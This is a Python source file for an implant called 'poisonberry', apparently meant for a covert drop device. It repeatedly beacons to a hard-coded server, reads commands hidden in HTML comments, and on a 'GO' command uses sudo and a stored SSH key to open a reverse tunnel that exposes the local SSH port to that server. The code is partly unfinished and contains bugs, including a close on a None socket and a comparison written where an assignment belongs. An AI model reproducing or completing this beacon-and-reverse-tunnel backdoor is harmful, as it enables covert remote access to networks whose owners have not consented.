import urllib.request
import urllib.error
import urllib.parse
import time
import socket
import os
import sys
from bs4 import BeautifulSoup, Comment
from utils import *




class poisonberry:

    def __init__(self):
        self.endpoint = {}
        self.beacon = True
        self.home= "watch"
        self.server = "192.168.1.104"
        self.data= {}
        self.command={}
        self.running = 0
        self.port = 22

    def art(self):
        print("""\                            
                                            
                            ____        _                  __                        
                           / __ \____  (_)________  ____  / /_  ___  ____________  __
                          / /_/ / __ \/ / ___/ __ \/ __ \/ __ \/ _ \/ ___/ ___/ / / /
                         / ____/ /_/ / (__  ) /_/ / / / / /_/ /  __/ /  / /  / /_/ / 
                        /_/    \____/_/____/\____/_/ /_/_.___/\___/_/  /_/   \__, /  
                                                                            /____/                     
                                            
                                               ._ o o
                                               \_`-)|_
                                            ,""       \ 
                                          ,"  ## |   ಠ ಠ. 
                                        ," ##   ,-\__    `.
                                      ,"       /     `--._;) Why tho
                                    ,"     ## /
                                  ,"   ##    /
                                  

                            """)
        time.sleep(5)

    def start(self):
       # self.art()
        while True: # run forever
                self.GET()              # http beacon
                log(INFO,"pausing before next beacon")
                time.sleep(5)           # sleep between beacons

    def close_tunnel(self):
        host="0.0.0.0"
        port = self.port

        s = None
        for res in socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM):
            af, socktype, proto, canonname, sa = res

            s.close()

        '''
        #old socket stuff, keep for reference for now but dump if useless
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = False

        try:

        #todo add something that frees the port when the server exits the tunnel --> would it need to be a beacon?
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = False
        try:
            sock.bind(("0.0.0.0", self.port))
            print("port is free")
            self.beacon = True
            result = True
        except:
            print("Port is in use")
        sock.close()
        return result
        '''

    def GET(self):
         self.handle_request()


    def stop(self):
        try:
            print("DONE")
        except:
            print( "the fuck")


    def handle_request(self):
        try:
                log(INFO,"trying to GET from %s"%(self.endpoint))
                self.endpoint = "http://"+self.server+":8000/site.html"
                self.data = urllib.request.urlopen(self.endpoint)

                self.parse_response()
        except urllib.error.URLError as e:
                log(WARN,"failed to connect to %s, error %s" %(self.endpoint, e.__dict__))
               # print(e.__dict__)

    def parse_response(self):
        self.data=self.data.read().decode('utf-8')
        log(DEBUG,"data received %s" %(self.data))
        #print(self.data)

        soup = BeautifulSoup(self.data, 'lxml')
        comments = soup.findAll(text=lambda text:isinstance(text, Comment))
        self.command = str(comments).split(":",1)[1][:-3]
        log(INFO,"command received %s"% (self.command))
      #  print(self.command)

        self.process_command()

    def process_command(self):
        print(self.command)
        if self.command == "GO" and self.running==0:

            log(INFO,"Creating tunnel")
            cmd = 'sudo /usr/bin/ssh -i /etc/berry_key -fN -R 7888:localhost:' + str(self.port) + " " + self.home + "@" + self.server  # TODO not any of this see blackhat sshtunnel with python script
            print(cmd)
            os.system(cmd)
            log(DEBUG, "running")
            self.running = 1

        elif self.command == "KILL" and self.running==1:
            log(INFO,"Closing Tunnel")
            self.close_tunnel()
            self.running == 0






        else:
            log(DEBUG,"no new command")

            #old idea of if run once ignore subsequent commands, untested so idk if we need this still
            '''
            if self.run != 1: # TODO not this, we need a better way to not run a command multiple times when run
                os.system(cmd)
                self.run =1
                self.beacon = False
            else:
                log(DEBUG,"running")
                print("running")
            '''

    def ssh_tunnel(self):
        log(INFO, "write this part")


c=poisonberry()

c.start()
#c.GET()

